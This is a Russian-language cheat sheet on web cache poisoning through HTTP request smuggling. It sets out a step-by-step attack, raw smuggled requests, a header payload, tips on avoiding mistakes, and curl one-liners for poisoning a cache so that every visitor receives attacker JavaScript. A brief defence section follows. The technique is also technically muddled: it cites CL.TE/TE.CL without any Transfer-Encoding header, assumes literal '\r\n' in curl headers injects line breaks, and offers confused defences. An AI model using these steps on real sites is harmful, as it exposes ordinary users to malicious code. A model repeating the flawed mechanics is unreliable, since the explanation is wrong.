# WEB CACHE POISONING via REQUEST SMUGGLING

## Что это
Атака, при которой злоумышленник заставляет прокси-сервер (кэширующий) сохранить вредоносный контент по чужому URL. В результате все пользователи, запрашивающие легитимный ресурс, получают вредоносный код.

## Условия для атаки

- Прокси (HAProxy, nginx) уязвим к request smuggling (CL.TE / TE.CL)
- Прокси кэширует ответы
- Есть способ загрузить свой контент на сервер (`/upload`, `/comments`, и т.д.)


## Алгоритм атаки

### Шаг 1 — Загрузить вредоносный файл на сервер

Загружаем `attack.js` на сервер, например, через `/uploads/attack.js`.


### Шаг 2 — Отправить smuggling-запрос

Создаём HTTP/1.1 запрос, который запутает прокси и бэкенд:

```http
GET /target.js HTTP/1.1
Host: target.com
Pragma: no-cache
Content-Length: [ТОЧНО]
Foo: bar\r\n
Host: target.com\r\n
\r\n
GET /uploads/attack.js HTTP/1.1
Host: target.com\r\n
\r\n
```

### Шаг 3 — Десинхронизация

- Прокси видит **1 запрос**
- Бэкенд видит **2 запроса**

Первый ответ (`target.js`) отдаётся клиенту.  
Второй ответ (`attack.js`) остаётся в буфере соединения.


### Шаг 4 — Кэширование вредоносного ответа

Отправляем обычный `GET /target.js` в том же соединении.  
Бэкенд отдаёт застрявший ответ (`attack.js`).  
Прокси кэширует `attack.js` как `target.js`.


### Шаг 5 — Массовое отравление

Все пользователи, запрашивающие `/target.js`, получают вредоносный код.


## Ключевые детали

- Внешний запрос — **только HTTP/1.1** (не HTTP/2)
- `Content-Length` считается строго по длине тела
- Каждая строка заканчивается на `\r\n`
- Между заголовками smuggled-запроса и его телом — пустая строка `\r\n\r\n`
- `Pragma: no-cache` — заставляет прокси игнорировать существующий кэш
- Второй запрос нужно отправить **до истечения TTL** кэша


## Пример payload (в поле foo)

```
bar\r\n
Host: target.com\r\n
\r\n
GET /uploads/payload.js HTTP/1.1\r\n
```


## Типичные ошибки

- ❌ Использование HTTP/2 → smuggling не работает
- ❌ Неверный `Content-Length` → запрос обрезается или зависает
- ❌ Нет пустой строки `\r\n` между заголовками и телом smuggled-запроса
- ❌ Второй запрос отправлен слишком поздно → кэш очистился
- ❌ Нет `Pragma: no-cache` → прокси отдаёт старый кэш


## Защита

- Обновить прокси (nginx, HAProxy, Envoy) до актуальных версий
- Отключить кэширование для динамических URL
- Использовать HTTP/2 для всех соединений (если возможно)
- Использовать `X-Forwarded-For` и валидацию запросов
- Настроить WAF на обнаружение smuggling-паттернов


## Как проверить уязвимость

```bash
# Проверить версию nginx
nginx -V

# Проверить через curl
curl -v -H "Host: target.com" \
  -H "Content-Length: 100" \
  -H "Foo: bar\r\nHost: target.com\r\n\r\nGET /uploads/attack.js HTTP/1.1" \
  http://target.com/target.js
```


## Шпаргалка (быстрые команды)

```bash
# Отправить smuggling-запрос
curl -v -H "Host: target.com" -H "Content-Length: 100" -H "Foo: bar\r\nHost: target.com\r\n\r\nGET /uploads/attack.js HTTP/1.1" http://target.com/target.js

# Проверить, закэшировался ли контент
curl -v http://target.com/target.js

# Сбросить кэш (если есть доступ)
# nginx: /var/cache/nginx
# HAProxy: /var/lib/haproxy/cache
```